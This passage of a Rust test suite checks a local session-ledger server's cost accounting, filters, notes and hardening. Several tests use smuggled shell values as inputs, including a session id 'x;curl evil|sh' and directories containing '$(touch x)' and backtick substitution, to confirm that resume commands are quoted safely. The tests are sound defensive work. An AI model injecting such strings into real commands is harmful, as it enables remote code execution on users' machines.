mod common;

use common::{agent, assistant_line, prompt_line, recap_line, set_mtime_ago, start, title_line, usage, Env};
use serde_json::Value;
use session_ledger::config::Config;
use session_ledger::db::Db;
use session_ledger::ingest::ingest_session;
use session_ledger::server::{self, resume_command};
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;

const PRICES: &str = "
[prices.test-model]
input = 3.0
output = 15.0
cache_read = 0.30
cache_write_5m = 3.75
cache_write_1h = 6.0
";

fn cfg(extra: &str) -> Config {
    toml::from_str(&format!("{extra}\n{PRICES}")).unwrap()
}

fn ts(ago_ms: i64) -> String {
    let t = chrono::Utc::now() - chrono::Duration::milliseconds(ago_ms);
    t.format("%Y-%m-%dT%H:%M:%S%.3fZ").to_string()
}

const MIN: i64 = 60_000;
const DAY: i64 = 86_400_000;

/// Writes a session with one prompt and optional extra lines, then ingests it.
fn seed(env: &Env, project: &str, sid: &str, cwd: &str, prompt: &str, ago: i64, extra: &[String]) -> PathBuf {
    let mut lines = vec![prompt_line(sid, &ts(ago), cwd, "main", prompt)];
    lines.extend_from_slice(extra);
    let path = env.write_session(project, sid, &lines);
    let mut db = Db::open(&env.paths().db_file()).unwrap();
    ingest_session(&mut db, &path).unwrap();
    path
}

fn msg(sid: &str, id: &str, model: &str, ago: i64) -> String {
    assistant_line(sid, &ts(ago), id, &format!("req_{id}"), model, usage(1000, 2000, 100_000, 10_000, 20_000))
}

fn get(addr: &str, path: &str) -> (u16, Value) {
    let mut r = agent().get(format!("http://{addr}{path}")).call().unwrap();
    let status = r.status().as_u16();
    let body = r.body_mut().read_to_string().unwrap();
    (status, serde_json::from_str(&body).unwrap_or(Value::Null))
}

fn put_note(addr: &str, id: &str, body: &str) -> u16 {
    let mut r = agent()
        .put(format!("http://{addr}/api/sessions/{id}/note"))
        .header("Content-Type", "application/json")
        .send(body)
        .unwrap();
    let _ = r.body_mut().read_to_string();
    r.status().as_u16()
}

/// Raw HTTP/1.1 request; returns the status code and the full response text.
fn raw(addr: &str, request: &str) -> (u16, String) {
    let mut s = TcpStream::connect(addr).unwrap();
    s.write_all(request.as_bytes()).unwrap();
    let mut out = String::new();
    s.read_to_string(&mut out).unwrap();
    let status = out.split_whitespace().nth(1).unwrap().parse().unwrap();
    (status, out)
}

fn approx(a: &Value, b: f64) {
    let a = a.as_f64().unwrap_or_else(|| panic!("not a number: {a}"));
    assert!((a - b).abs() < 1e-9, "{a} vs {b}");
}

fn first_session(addr: &str) -> Value {
    get(addr, "/api/sessions").1["sessions"][0].clone()
}

#[test]
fn list_returns_seeded_sessions_newest_first() {
    let env = Env::new();
    let old = seed(&env, "p", "old", "/w/a", "older", 3 * DAY, &[]);
    set_mtime_ago(&old, 3 * DAY as u64);
    seed(&env, "p", "new", "/w/b", "newer", MIN, &[]);
    let addr = start(&env, cfg(""));
    let (status, v) = get(&addr, "/api/sessions");
    assert_eq!(status, 200);
    assert_eq!(v["cost_mode"], "list");
    // cfg("") carries a [prices] entry.
    assert_eq!(v["cost_label"], "API list price, with your overrides");
    assert!(v["prices_as_of"].is_string());
    let ids: Vec<&str> = v["sessions"].as_array().unwrap().iter().map(|s| s["id"].as_str().unwrap()).collect();
    assert_eq!(ids, ["new", "old"]);
    let s = &v["sessions"][0];
    assert_eq!(s["title"], "newer");
    assert_eq!(s["project"], "b");
    assert_eq!(s["project_dir"], "/w/b");
    assert_eq!(s["branch"], "main");
    assert_eq!(s["running"], true);
    assert_eq!(s["resumable"], true);
    assert_eq!(s["automated"], false);
    assert_eq!(v["sessions"][1]["running"], false);
}

#[test]
fn tokens_and_cost_match_hand_calculation() {
    let env = Env::new();
    seed(&env, "p", "s1", "/w/a", "hi", MIN, &[msg("s1", "m1", "test-model", MIN)]);
    let s = first_session(&start(&env, cfg("")));
    assert_eq!(s["tokens"]["input"], 1000);
    assert_eq!(s["tokens"]["output"], 2000);
    assert_eq!(s["tokens"]["cache_read"], 100_000);
    assert_eq!(s["tokens"]["cache_write_5m"], 10_000);
    assert_eq!(s["tokens"]["cache_write_1h"], 20_000);
    assert_eq!(s["tokens"]["total"], 133_000);
    approx(&s["cost"], 0.2205);
    assert_eq!(s["cost_partial"], false);
}

#[test]
fn tokens_mode_hides_cost() {
    let env = Env::new();
    seed(&env, "p", "s1", "/w/a", "hi", MIN, &[msg("s1", "m1", "test-model", MIN)]);
    let addr = start(&env, cfg("cost_mode = \"tokens\""));
    let (_, v) = get(&addr, "/api/sessions");
    assert_eq!(v["cost_mode"], "tokens");
    assert_eq!(v["cost_label"], "");
    assert!(v["sessions"][0]["cost"].is_null());
    assert_eq!(v["sessions"][0]["tokens"]["total"], 133_000);
}

#[test]
fn custom_mode_applies_multiplier() {
    let env = Env::new();
    seed(&env, "p", "s1", "/w/a", "hi", MIN, &[msg("s1", "m1", "test-model", MIN)]);
    let addr = start(&env, cfg("cost_mode = \"custom\"\nmultiplier = 0.5"));
    let (_, v) = get(&addr, "/api/sessions");
    assert_eq!(v["cost_label"], "Custom rates");
    approx(&v["sessions"][0]["cost"], 0.11025);
}

#[test]
fn unknown_model_gives_null_cost_and_mixed_gives_partial() {
    let env = Env::new();
    seed(&env, "p", "unk", "/w/a", "hi", 2 * MIN, &[msg("unk", "m1", "mystery-model", 2 * MIN)]);
    seed(
        &env,
        "p",
        "mix",
        "/w/b",
        "hi",
        MIN,
        &[msg("mix", "m2", "test-model", MIN), msg("mix", "m3", "mystery-model", MIN)],
    );
    let (_, v) = get(&start(&env, cfg("")), "/api/sessions");
    let by_id = |id: &str| v["sessions"].as_array().unwrap().iter().find(|s| s["id"] == id).unwrap().clone();
    let unk = by_id("unk");
    assert!(unk["cost"].is_null());
    assert_eq!(unk["cost_partial"], false);
    assert_eq!(unk["tokens"]["total"], 133_000);
    let mix = by_id("mix");
    approx(&mix["cost"], 0.2205);
    assert_eq!(mix["cost_partial"], true);
}

#[test]
fn combined_session_matches_hand_calculated_totals() {
    let env = Env::new();
    let sid = "combo";
    let a = msg(sid, "msg_a", "test-model", 3 * MIN);
    let c_line = assistant_line(sid, &ts(MIN), "msg_c", "req_msg_c", "unknown-model", usage(1000, 2000, 100_000, 10_000, 20_000));
    // msg_a appears on three lines (one message streamed in pieces); it counts once.
    let extra = vec![a.clone(), a.clone(), a, msg(sid, "msg_b", "test-model", 2 * MIN), c_line];
    seed(&env, "p", sid, "/w/a", "hi", 4 * MIN, &extra);
    env.write_subagent("p", sid, "agent-1", &[msg(sid, "msg_d", "test-model", MIN)]);
    let mut db = Db::open(&env.paths().db_file()).unwrap();
    ingest_session(&mut db, &env.claude.join("projects/p").join(format!("{sid}.jsonl"))).unwrap();
    let s = first_session(&start(&env, cfg("")));
    assert_eq!(s["tokens"]["total"], 4 * 133_000);
    approx(&s["cost"], 3.0 * 0.2205);
    assert_eq!(s["cost_partial"], true);
}

/// A session with main messages `main_ids` (test-model) and one sub-agent file per
/// `(agent, id, model)`, ingested; each message is the same usage (133000 tokens).
fn seed_split(env: &Env, sid: &str, main_ids: &[&str], agents: &[(&str, &str, &str)]) {
    let extra: Vec<String> = main_ids.iter().map(|id| msg(sid, id, "test-model", 2 * MIN)).collect();
    let path = seed(env, "p", sid, "/w/a", "hi", 3 * MIN, &extra);
    for (agent, id, model) in agents {
        env.write_subagent("p", sid, agent, &[msg(sid, id, model, MIN)]);
    }
    let mut db = Db::open(&env.paths().db_file()).unwrap();
    ingest_session(&mut db, &path).unwrap();
}

#[test]
fn detail_splits_main_and_subagent_usage() {
    let env = Env::new();
    seed_split(
        &env,
        "s1",
        &["msg_a", "msg_b"],
        &[("agent-1", "msg_c", "test-model"), ("agent-2", "msg_d", "unknown-model")],
    );
    let (status, s) = get(&start(&env, cfg("")), "/api/sessions/s1");
    assert_eq!(status, 200);
    let (main, subs) = (&s["split"]["main"], &s["split"]["subagents"]);
    assert_eq!(main["tokens"], 266_000);
    approx(&main["cost"], 2.0 * 0.2205);
    assert_eq!(main["cost_partial"], false);
    assert_eq!(subs["tokens"], 266_000);
    approx(&subs["cost"], 0.2205);
    assert_eq!(subs["cost_partial"], true);
    assert_eq!(subs["count"], 2);
    assert_eq!(
        main["tokens"].as_u64().unwrap() + subs["tokens"].as_u64().unwrap(),
        s["tokens"]["total"].as_u64().unwrap()
    );
    let both = main["cost"].as_f64().unwrap() + subs["cost"].as_f64().unwrap();
    approx(&s["cost"], both);
}

#[test]
fn split_is_zero_for_a_session_without_subagents() {
    let env = Env::new();
    seed_split(&env, "s1", &["msg_a"], &[]);
    let (_, s) = get(&start(&env, cfg("")), "/api/sessions/s1");
    let (main, subs) = (&s["split"]["main"], &s["split"]["subagents"]);
    assert_eq!(main["tokens"], 133_000);
    approx(&main["cost"], 0.2205);
    assert_eq!(subs["tokens"], 0);
    approx(&subs["cost"], 0.0);
    assert_eq!(subs["cost_partial"], false);
    assert_eq!(subs["count"], 0);
}

#[test]
fn split_cost_is_null_in_tokens_mode_and_scaled_in_custom_mode() {
    let env = Env::new();
    seed_split(&env, "s1", &["msg_a"], &[("agent-1", "msg_c", "test-model")]);
    let (_, s) = get(&start(&env, cfg("cost_mode = \"tokens\"")), "/api/sessions/s1");
    for group in ["main", "subagents"] {
        let g = &s["split"][group];
        assert!(g["cost"].is_null(), "{group}: {g}");
        assert_eq!(g["cost_partial"], false, "{group}");
        assert_eq!(g["tokens"], 133_000, "{group}");
    }
    let (_, s) = get(&start(&env, cfg("cost_mode = \"custom\"\nmultiplier = 0.5")), "/api/sessions/s1");
    approx(&s["split"]["main"]["cost"], 0.11025);
    approx(&s["split"]["subagents"]["cost"], 0.11025);
}

#[test]
fn split_cost_is_null_for_a_group_with_no_priced_message() {
    let env = Env::new();
    seed_split(&env, "s1", &["msg_a"], &[("agent-1", "msg_c", "unknown-model")]);
    let (_, s) = get(&start(&env, cfg("")), "/api/sessions/s1");
    approx(&s["split"]["main"]["cost"], 0.2205);
    assert!(s["split"]["subagents"]["cost"].is_null());
    assert_eq!(s["split"]["subagents"]["cost_partial"], false);
    assert_eq!(s["split"]["subagents"]["count"], 1);
}

#[test]
fn list_response_has_no_split() {
    let env = Env::new();
    seed_split(&env, "s1", &["msg_a"], &[("agent-1", "msg_c", "test-model")]);
    let s = first_session(&start(&env, cfg("")));
    assert_eq!(s["id"], "s1");
    assert!(s.get("split").is_none(), "{s}");
}

#[test]
fn description_prefers_recap_then_first_prompt() {
    let env = Env::new();
    seed(&env, "p", "r", "/w/a", "first words", 2 * MIN, &[recap_line("r", &ts(MIN), "The recap")]);
    seed(&env, "p", "f", "/w/b", "only a prompt", MIN, &[]);
    let path = env.write_session("p", "t", &[title_line("t", "Just a title")]);
    let mut db = Db::open(&env.paths().db_file()).unwrap();
    ingest_session(&mut db, &path).unwrap();
    let addr = start(&env, cfg(""));
    let (_, v) = get(&addr, "/api/sessions?period=all&automated=1");
    let by_id = |id: &str| v["sessions"].as_array().unwrap().iter().find(|s| s["id"] == id).unwrap().clone();
    assert_eq!((by_id("r")["description"].as_str(), by_id("r")["description_kind"].as_str()), (Some("The recap"), Some("recap")));
    assert_eq!(by_id("r")["title"], "first words");
    assert_eq!((by_id("f")["description"].as_str(), by_id("f")["description_kind"].as_str()), (Some("only a prompt"), Some("first_prompt")));
    assert_eq!((by_id("t")["description"].as_str(), by_id("t")["description_kind"].as_str()), (Some(""), Some("none")));
    assert_eq!(by_id("t")["title"], "Just a title");
}

#[test]
fn period_and_automated_filters() {
    let env = Env::new();
    seed(&env, "p", "d1", "/w/a", "x", DAY, &[]);
    seed(&env, "p", "d10", "/w/b", "x", 10 * DAY, &[]);
    seed(&env, "p", "d20", "/w/c", "x", 20 * DAY, &[]);
    // No prompt at all: counted as automated.
    let path = env.write_session("p", "auto", &[msg("auto", "m1", "test-model", MIN)]);
    let mut db = Db::open(&env.paths().db_file()).unwrap();
    ingest_session(&mut db, &path).unwrap();
    let addr = start(&env, cfg(""));
    let ids = |q: &str| -> Vec<String> {
        get(&addr, &format!("/api/sessions{q}")).1["sessions"]
            .as_array()
            .unwrap()
            .iter()
            .map(|s| s["id"].as_str().unwrap().to_string())
            .collect()
    };
    assert_eq!(ids(""), ["d1", "d10"]);
    assert_eq!(ids("?period=7"), ["d1"]);
    assert_eq!(ids("?period=all"), ["d1", "d10", "d20"]);
    assert_eq!(ids("?automated=1"), ["auto", "d1", "d10"]);
    assert_eq!(get(&addr, "/api/sessions?period=3").0, 400);
    assert_eq!(get(&addr, "/api/sessions?automated=2").0, 400);
}

#[test]
fn same_named_projects_are_disambiguated() {
    let env = Env::new();
    seed(&env, "p", "s1", "/a/api", "x", 3 * MIN, &[]);
    seed(&env, "p", "s2", "/b/api", "x", 2 * MIN, &[]);
    seed(&env, "p", "s3", "/c/web", "x", MIN, &[]);
    let (_, v) = get(&start(&env, cfg("")), "/api/sessions");
    let label = |id: &str| v["sessions"].as_array().unwrap().iter().find(|s| s["id"] == id).unwrap()["project"].clone();
    assert_eq!(label("s1"), "a/api");
    assert_eq!(label("s2"), "b/api");
    assert_eq!(label("s3"), "web");
}

#[test]
fn detail_has_resume_command() {
    let env = Env::new();
    seed(&env, "p", "abc", "/Users/x/proj", "the first", 2 * MIN, &[msg("abc", "m1", "test-model", MIN)]);
    let (status, v) = get(&start(&env, cfg("")), "/api/sessions/abc");
    assert_eq!(status, 200);
    assert_eq!(v["resume_command"], "cd /Users/x/proj && claude --resume abc");
    assert_eq!(v["first_prompt"], "the first");
    assert_eq!(v["last_prompt"], "the first");
    assert_eq!(v["models"], serde_json::json!(["test-model"]));
    assert!(v["continued_from"].is_null());
    assert_eq!(v["tokens"]["total"], 133_000);
}

#[test]
fn resume_command_quotes_awkward_paths() {
    assert_eq!(resume_command("/Users/x/my proj", "abc"), "cd '/Users/x/my proj' && claude --resume abc");
    assert_eq!(resume_command("/Users/x/it's", "abc"), r"cd '/Users/x/it'\''s' && claude --resume abc");
    assert_eq!(resume_command("~/work/api", "abc"), "cd ~/work/api && claude --resume abc");
}

#[test]
fn resume_command_quotes_awkward_session_ids() {
    assert_eq!(
        resume_command("/Users/x/proj", "x;curl evil|sh"),
        "cd /Users/x/proj && claude --resume 'x;curl evil|sh'"
    );
    let uuid = "0b6f2c1e-9a4d-4f7e-8c3b-1d2e3f4a5b6c";
    assert_eq!(
        resume_command("/Users/x/proj", uuid),
        format!("cd /Users/x/proj && claude --resume {uuid}")
    );
}

#[test]
fn resume_command_quotes_shell_syntax_in_directories() {
    for dir in ["/w/$(touch x)", "/w/a`id`b", "/w/line\nbreak"] {
        let dir = dir.replace("\\n", "\n");
        assert_eq!(resume_command(&dir, "abc"), format!("cd '{dir}' && claude --resume abc"));
    }
}

#[test]
fn missing_transcript_is_not_resumable() {
    let env = Env::new();
    let path = seed(&env, "p", "gone", "/w/a", "x", MIN, &[msg("gone", "m1", "test-model", MIN)]);
    std::fs::remove_file(&path).unwrap();
    Db::open(&env.paths().db_file()).unwrap().refresh_missing().unwrap();
    let addr = start(&env, cfg(""));
    let s = first_session(&addr);
    assert_eq!(s["id"], "gone");
    assert_eq!(s["resumable"], false);
    assert_eq!(s["running"], false);
    assert_eq!(s["tokens"]["total"], 133_000);
    assert!(get(&addr, "/api/sessions/gone").1["resume_command"].is_null());
}

#[test]
fn resumable_follows_the_file_live() {
    let env = Env::new();
    let path = seed(&env, "p", "live", "/w/a", "x", MIN, &[msg("live", "m1", "test-model", MIN)]);
    let addr = start(&env, cfg(""));
    let (_, before) = get(&addr, "/api/sessions/live");
    assert_eq!(before["resumable"], true);
    assert_eq!(before["running"], true);
    assert!(before["resume_command"].is_string());
    std::fs::remove_file(&path).unwrap(); // no sweep
    let (_, after) = get(&addr, "/api/sessions/live");
    assert_eq!(after["resumable"], false);
    assert_eq!(after["running"], false);
    assert!(after["resume_command"].is_null());
    assert_eq!(after["tokens"], before["tokens"]);
}

#[test]
fn running_follows_the_transcript_mtime_during_a_long_turn() {
    let env = Env::new();
    let path = seed(&env, "p", "long", "/w/a", "x", 30 * MIN, &[]);
    let addr = start(&env, cfg(""));
    // last_active_at is 30 minutes old, but the file was just written.
    let s = get(&addr, "/api/sessions/long").1;
    assert!(s["last_active_at"].as_i64().unwrap() < chrono::Utc::now().timestamp_millis() - 29 * MIN);
    assert_eq!(s["running"], true);
    assert_eq!(first_session(&addr)["running"], true);
    set_mtime_ago(&path, 30 * MIN as u64);
    assert_eq!(get(&addr, "/api/sessions/long").1["running"], false);
    assert_eq!(first_session(&addr)["running"], false);
}

#[test]
fn note_round_trip() {
    let env = Env::new();
    seed(&env, "p", "n1", "/w/a", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    assert_eq!(get(&addr, "/api/sessions/n1").1["note"], "");
    assert_eq!(put_note(&addr, "n1", r#"{"note":"remember this"}"#), 200);
    assert_eq!(get(&addr, "/api/sessions/n1").1["note"], "remember this");
    assert_eq!(first_session(&addr)["note"], "remember this");
}

#[test]
fn note_errors() {
    let env = Env::new();
    seed(&env, "p", "n1", "/w/a", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    assert_eq!(put_note(&addr, "nope", r#"{"note":"x"}"#), 404);
    let long = format!(r#"{{"note":"{}"}}"#, "a".repeat(4001));
    assert_eq!(put_note(&addr, "n1", &long), 400);
    let ok = format!(r#"{{"note":"{}"}}"#, "é".repeat(4000));
    assert_eq!(put_note(&addr, "n1", &ok), 200);
    assert_eq!(put_note(&addr, "n1", "not json"), 400);
    assert_eq!(put_note(&addr, "n1", r#"{"note":5}"#), 400);

    let req = |extra: &str, body: &str| {
        format!(
            "PUT /api/sessions/n1/note HTTP/1.1\r\nHost: {addr}\r\n{extra}Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
    };
    assert_eq!(raw(&addr, &req("", r#"{"note":"x"}"#)).0, 415);
    assert_eq!(raw(&addr, &req("Content-Type: text/plain\r\n", r#"{"note":"x"}"#)).0, 415);
    // An oversized body is refused from its declared length, without being sent.
    let big = format!(
        "PUT /api/sessions/n1/note HTTP/1.1\r\nHost: {addr}\r\nContent-Type: application/json\r\nContent-Length: 70000\r\nConnection: close\r\n\r\n"
    );
    assert_eq!(raw(&addr, &big).0, 413);
}

#[test]
fn foreign_host_header_is_refused() {
    let env = Env::new();
    let addr = start(&env, cfg(""));
    let port = addr.rsplit(':').next().unwrap();
    let req = |host: &str| format!("GET /api/sessions HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
    assert_eq!(raw(&addr, &req("evil.example")).0, 403);
    assert_eq!(raw(&addr, &req("127.0.0.1:1")).0, 403);
    assert_eq!(raw(&addr, &req(&format!("localhost:{port}"))).0, 200);
    assert_eq!(raw(&addr, &req(&addr)).0, 200);
}

#[test]
fn unknown_path_is_404_and_assets_are_served() {
    let env = Env::new();
    let addr = start(&env, cfg(""));
    assert_eq!(get(&addr, "/nope").0, 404);
    assert_eq!(get(&addr, "/api/nope").0, 404);
    assert_eq!(get(&addr, "/fonts/missing.woff2").0, 404);
    assert_eq!(get(&addr, "/api/sessions/none").0, 404);
    for (path, ct) in [
        ("/", "text/html; charset=utf-8"),
        ("/app.css", "text/css; charset=utf-8"),
        ("/app.js", "text/javascript; charset=utf-8"),
    ] {
        let r = agent().get(format!("http://{addr}{path}")).call().unwrap();
        assert_eq!(r.status().as_u16(), 200, "{path}");
        assert_eq!(r.headers().get("content-type").unwrap(), ct, "{path}");
        assert_eq!(r.headers().get("cache-control").unwrap(), "no-store", "{path}");
    }
}

#[test]
fn shell_quote_leaves_plain_strings_alone() {
    assert_eq!(server::shell_quote("/a/b_c-d.e~"), "/a/b_c-d.e~");
    assert_eq!(server::shell_quote("a b"), "'a b'");
    assert_eq!(server::shell_quote(""), "''");
}

#[test]
fn serve_prints_url_and_answers_requests() {
    let env = Env::new();
    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_sled"))
        .args(["serve", "--port", "0"])
        .env("CLAUDE_CONFIG_DIR", &env.claude)
        .env("SLED_DATA_DIR", &env.data)
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(child.stdout.take().unwrap()).read_line(&mut line).unwrap();
    let url = line.trim().strip_prefix("Session ledger is running at http://").unwrap().to_string();
    let (status, v) = get(&url, "/api/sessions");
    child.kill().unwrap();
    child.wait().unwrap();
    assert_eq!(status, 200);
    assert!(v["sessions"].as_array().unwrap().is_empty());
}

#[test]
fn serve_reports_a_port_in_use() {
    let env = Env::new();
    let taken = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = taken.local_addr().unwrap().port().to_string();
    let out = env.sled().args(["serve", "--port", &port]).assert().code(1);
    let err = String::from_utf8_lossy(&out.get_output().stderr).to_string();
    assert!(err.contains("already in use") && err.contains("--port"), "{err}");
}

// ---- hardening ----

fn detail(addr: &str, id: &str) -> Value {
    get(addr, &format!("/api/sessions/{id}")).1
}

#[test]
fn resume_is_offered_only_for_an_absolute_folder_and_a_safe_id() {
    let env = Env::new();
    seed(&env, "p", "ok-id_1", "/w/a", "x", MIN, &[]);
    seed(&env, "p", "rel", "relative/dir", "x", MIN, &[]);
    seed(&env, "p", "bad;id", "/w/a", "x", MIN, &[]);
    seed(&env, "p", "-dash", "/w/a", "x", MIN, &[]);
    let gone = seed(&env, "p", "gone", "relative/dir", "x", MIN, &[]);
    std::fs::remove_file(gone).unwrap();
    let addr = start(&env, cfg(""));

    let ok = detail(&addr, "ok-id_1");
    assert_eq!(ok["resume_command"], "cd /w/a && claude --resume ok-id_1");
    assert!(ok["resume_blocked"].is_null(), "{ok}");

    let rel = detail(&addr, "rel");
    assert!(rel["resume_command"].is_null());
    assert_eq!(rel["resume_blocked"], "no_folder");
    assert_eq!(rel["resumable"], true, "resumable keeps its meaning");

    for id in ["bad;id", "-dash"] {
        let s = detail(&addr, id);
        assert!(s["resume_command"].is_null(), "{id}");
        assert_eq!(s["resume_blocked"], "unsafe_id", "{id}");
    }
    // The transcript check comes first, before the folder check.
    let g = detail(&addr, "gone");
    assert!(g["resume_command"].is_null());
    assert_eq!(g["resume_blocked"], "transcript_removed");
    assert_eq!(g["resumable"], false);
}

#[test]
fn session_without_a_folder_is_blocked_as_no_folder() {
    let env = Env::new();
    let path = env.write_session("p", "nofolder", &[title_line("nofolder", "T")]);
    let mut db = Db::open(&env.paths().db_file()).unwrap();
    ingest_session(&mut db, &path).unwrap();
    let s = detail(&start(&env, cfg("")), "nofolder");
    assert!(s["resume_command"].is_null());
    assert_eq!(s["resume_blocked"], "no_folder");
    assert_eq!(s["dir_exists"], false);
}

#[test]
fn tilde_folder_keeps_the_tilde_unquoted() {
    assert_eq!(resume_command("~/my proj", "abc"), "cd ~/'my proj' && claude --resume abc");
    assert_eq!(resume_command("~/it's", "abc"), r"cd ~/'it'\''s' && claude --resume abc");
    assert_eq!(resume_command("~/", "abc"), "cd ~/'' && claude --resume abc");
    let env = Env::new();
    seed(&env, "p", "t1", "~/my proj", "x", MIN, &[]);
    let s = detail(&start(&env, cfg("")), "t1");
    assert_eq!(s["resume_command"], "cd ~/'my proj' && claude --resume t1");
    assert!(s["resume_blocked"].is_null());
}

#[test]
fn dir_exists_follows_the_folder_and_the_command_stays() {
    let env = Env::new();
    let real = env.tmp.path().join("work");
    std::fs::create_dir_all(&real).unwrap();
    let real_s = real.to_str().unwrap().to_string();
    seed(&env, "p", "here", &real_s, "x", MIN, &[]);
    seed(&env, "p", "away", "/no/such/folder/anywhere", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    assert_eq!(detail(&addr, "here")["dir_exists"], true);
    let away = detail(&addr, "away");
    assert_eq!(away["dir_exists"], false);
    assert_eq!(away["resume_command"], "cd /no/such/folder/anywhere && claude --resume away");
    std::fs::remove_dir(&real).unwrap();
    assert_eq!(detail(&addr, "here")["dir_exists"], false, "checked live");
}

#[test]
fn dir_exists_expands_a_tilde_with_home() {
    let env = Env::new();
    let home = env.tmp.path().join("home");
    std::fs::create_dir_all(home.join("proj")).unwrap();
    seed(&env, "p", "t1", "~/proj", "x", MIN, &[]);
    seed(&env, "p", "t2", "~/missing", "x", MIN, &[]);
    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_sled"))
        .args(["serve", "--port", "0"])
        .env("CLAUDE_CONFIG_DIR", &env.claude)
        .env("SLED_DATA_DIR", &env.data)
        .env("HOME", &home)
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(child.stdout.take().unwrap()).read_line(&mut line).unwrap();
    let url = line.trim().strip_prefix("Session ledger is running at http://").unwrap().to_string();
    let (t1, t2) = (detail(&url, "t1"), detail(&url, "t2"));
    child.kill().unwrap();
    child.wait().unwrap();
    assert_eq!(t1["dir_exists"], true, "{t1}");
    assert_eq!(t2["dir_exists"], false, "{t2}");
}

#[test]
fn detail_project_label_is_disambiguated_like_the_list() {
    let env = Env::new();
    seed(&env, "p", "s1", "/a/api", "x", 3 * MIN, &[]);
    seed(&env, "p", "s2", "/b/api", "x", 2 * MIN, &[]);
    seed(&env, "p", "s3", "/c/web", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    assert_eq!(detail(&addr, "s1")["project"], "a/api");
    assert_eq!(detail(&addr, "s2")["project"], "b/api");
    assert_eq!(detail(&addr, "s3")["project"], "web");
}

/// Sends `request` and reads the reply, failing if nothing arrives within 2 seconds.
fn raw_within_2s(addr: &str, request: &str) -> u16 {
    let mut s = TcpStream::connect(addr).unwrap();
    s.set_read_timeout(Some(std::time::Duration::from_secs(2))).unwrap();
    s.write_all(request.as_bytes()).unwrap();
    let mut out = String::new();
    s.read_to_string(&mut out).expect("no reply within 2 seconds");
    out.split_whitespace().nth(1).unwrap().parse().unwrap()
}

#[test]
fn a_stalled_client_does_not_block_other_requests() {
    let env = Env::new();
    seed(&env, "p", "n1", "/w/a", "x", MIN, &[]);
    let addr = start(&env, cfg(""));
    // Full headers, part of the body, then silence: the request is handed to a worker,
    // which waits on the body. (tiny_http reads bodies up to 1 KB before handing the
    // request over, so the declared length is larger than that.)
    let mut stalled = TcpStream::connect(&addr).unwrap();
    stalled
        .write_all(
            format!(
                "PUT /api/sessions/n1/note HTTP/1.1\r\nHost: {addr}\r\nContent-Type: application/json\r\nContent-Length: 5000\r\n\r\n{{\"note\":"
            )
            .as_bytes(),
        )
        .unwrap();
    std::thread::sleep(std::time::Duration::from_millis(200));
    let started = std::time::Instant::now();
    let status = raw_within_2s(&addr, &format!("GET /api/sessions HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\n\r\n"));
    assert_eq!(status, 200);
    assert!(started.elapsed() < std::time::Duration::from_secs(2));
    drop(stalled);
}

/// A data folder whose `ledger.db` is a directory, so opening the database fails.
fn broken_db_env() -> Env {
    let env = Env::new();
    std::fs::create_dir_all(env.data.join("ledger.db")).unwrap();
    env
}

#[test]
fn internal_error_body_is_fixed() {
    let env = broken_db_env();
    let addr = start(&env, cfg(""));
    for path in ["/api/sessions", "/api/sessions/x"] {
        let mut r = agent().get(format!("http://{addr}{path}")).call().unwrap();
        assert_eq!(r.status().as_u16(), 500, "{path}");
        assert_eq!(r.body_mut().read_to_string().unwrap(), r#"{"error":"internal error"}"#, "{path}");
    }
}

#[test]
fn internal_error_detail_goes_to_stderr() {
    let env = broken_db_env();
    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_sled"))
        .args(["serve", "--port", "0"])
        .env("CLAUDE_CONFIG_DIR", &env.claude)
        .env("SLED_DATA_DIR", &env.data)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(child.stdout.take().unwrap()).read_line(&mut line).unwrap();
    let url = line.trim().strip_prefix("Session ledger is running at http://").unwrap().to_string();
    let (status, body) = get(&url, "/api/sessions");
    child.kill().unwrap();
    child.wait().unwrap();
    let mut err = String::new();
    child.stderr.take().unwrap().read_to_string(&mut err).unwrap();
    assert_eq!(status, 500);
    assert_eq!(body, serde_json::json!({"error": "internal error"}));
    assert!(err.starts_with("sled: ") && err.len() > "sled: \n".len(), "stderr: {err:?}");
    assert!(!err.contains("internal error"), "the detail, not the fixed text: {err:?}");
}

#[test]
fn cost_label_names_overrides_in_list_mode() {
    let env = Env::new();
    // cfg("") carries a [prices] entry.
    let (_, v) = get(&start(&env, cfg("")), "/api/sessions");
    assert_eq!(v["cost_label"], "API list price, with your overrides");
    let (_, v) = get(&start(&env, Config::default()), "/api/sessions");
    assert_eq!(v["cost_label"], "API list price");
    let (_, v) = get(&start(&env, cfg("cost_mode = \"custom\"")), "/api/sessions");
    assert_eq!(v["cost_label"], "Custom rates");
}

#[test]
fn more_host_headers() {
    let env = Env::new();
    let addr = start(&env, cfg(""));
    let port = addr.rsplit(':').next().unwrap();
    let req = |host: &str| format!("GET /api/sessions HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n");
    assert_eq!(raw(&addr, "GET /api/sessions HTTP/1.0\r\n\r\n").0, 403, "missing Host");
    assert_eq!(raw(&addr, &req(&format!("localhost.:{port}"))).0, 403);
    assert_eq!(raw(&addr, &req(&format!("[::1]:{port}"))).0, 403);
    assert_eq!(raw(&addr, &req("localhost")).0, 403);
    assert_eq!(raw(&addr, &req("127.0.0.1")).0, 403);
    assert_eq!(raw(&addr, &req(&format!("LOCALHOST:{port}"))).0, 200);
}

#[test]
fn token_totals_saturate_instead_of_overflowing() {
    let env = Env::new();
    let max = u64::MAX;
    let huge = serde_json::json!({"input_tokens":max,"output_tokens":max,
        "cache_read_input_tokens":max,
        "cache_creation":{"ephemeral_5m_input_tokens":max,"ephemeral_1h_input_tokens":max},
        "service_tier":"standard","speed":"standard"});
    // Each count is stored capped at i64::MAX, so three messages pass u64::MAX per kind.
